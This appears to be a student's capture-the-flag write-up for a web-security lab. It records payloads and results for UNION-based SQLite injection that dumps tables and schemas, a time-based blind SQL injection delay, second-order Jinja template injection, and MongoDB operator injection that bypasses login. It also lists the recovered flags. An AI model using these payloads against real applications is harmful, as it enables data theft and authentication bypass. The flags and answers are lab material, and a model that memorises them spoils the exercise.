## Task 1 - Database Info Extraction

**Vulnerable parameter:** status

**Payload (version):**
`status=Nobody' UNION SELECT version(),2,3,4,5 -- -`
**Result:** SQLite - FLAG: 3f1cd994d394f754d2d31a3a0beb9261

**Payload (tables):**
`status=Nobody' UNION SELECT group_concat(name),2,3,4,5 FROM sqlite_master WHERE type='table' -- -`
**Result:** Orders, RandomTable1-10, not_me, Users

## Task 2 - Data Exfiltration from not_me table

**Payload (find columns):**
`status=Nobody' UNION SELECT sql,2,3,4,5 FROM sqlite_master WHERE name='not_me' -- -`
**Result:** CREATE TABLE not_me (id INTEGER, value TEXT, name TEXT)

**Payload (extract data):**
`status=Nobody' UNION SELECT group_concat(id||'|'||name||'|'||value),2,3,4,5 FROM not_me -- -`
**Result:** 0|FLAG|851a30d168cd6f8ff774dc4b6c720066

**Bonus - Users table structure:**
CREATE TABLE Users (id INTEGER PRIMARY KEY, name VARCHAR(120), username VARCHAR(120) UNIQUE, password TEXT)

## Task 3 - Time-Based Blind SQL Injection

**Note:** Placing the delay inside a WHERE clause fails due to short-circuit evaluation 
(status='Nobody' is false, so AND conditions never execute). 
The delay must be placed in the SELECT column list instead.

**Payload:**
`status=Nobody' UNION SELECT (SELECT count(*) FROM (WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<30000000) SELECT x FROM r)),2,3,4,5 -- -`

**Result (42.75s delay):**
[1, "b392a248a0a12c206fbef5098f8fd5bd", "Paid", "TIMOUT FLAG", "FLAG@web0x01.hbtn"]

**Flag:** b392a248a0a12c206fbef5098f8fd5bd

## Task 4 - Second-Order Blind Injection (SSTI via Jinja)

**Technique:** The `name` field is stored during registration and later rendered 
through a Jinja template during login (server-side template injection, not classic SQLi).
The payload lies dormant until the second request triggers the template render.

**Register payload:**
POST /api/a3/sql_injection/second_order/register
{"username": "ssti2", "name": "{{FLAG}}", "password": "password123"}

**Trigger payload (login):**
POST /api/a3/sql_injection/second_order/login
{"username": "ssti2", "password": "password123"}

**Result:**
{"message":{"html":"<h1>Welcome Mr 8b815836739530ea8cc7929c29b63739</h1>", ...}}

**Flag:** 8b815836739530ea8cc7929c29b63739

## Task 5 - NoSQL Injection Discovery

**Vulnerable endpoint:** /api/a3/nosql_injection/sign_in (POST)

**Baseline (fails):**
{"username":"admin","password":"wrongpassword"} -> Invalid Credentials Provided

**Injection payload (auth bypass via MongoDB operator):**
{"username":{"$ne":null},"password":{"$ne":null}}

**Result:**
{"status":"success","message":"Congratulations For your Sign in!\nFLAG: 56c48f5ae9ab0ffaaafb2a28d4999341"}

## Task 5 - NoSQL Injection Discovery (CORRECTED - Not Harmful)

**Vulnerable endpoint:** /api/a3/nosql_injection/market_values (POST)

**Baseline:**
{"coin":"BTC"} -> returns Bitcoin data

**Injection payload (operator overrides filter):**
{"coin":{"$ne":null}}  or  {"coin":{"$gt":""}}  or  {"coin":{"$regex":"^"}}

**Result:** Returns HBTNc (first matching document) instead of an error,
proving the coin field is interpreted as a raw MongoDB query operator
rather than a sanitized string filter. This is NOT harmful since it only
exposes public market data (no auth bypass, no sensitive data exposure) -
unlike the sign_in endpoint which allows full authentication bypass.
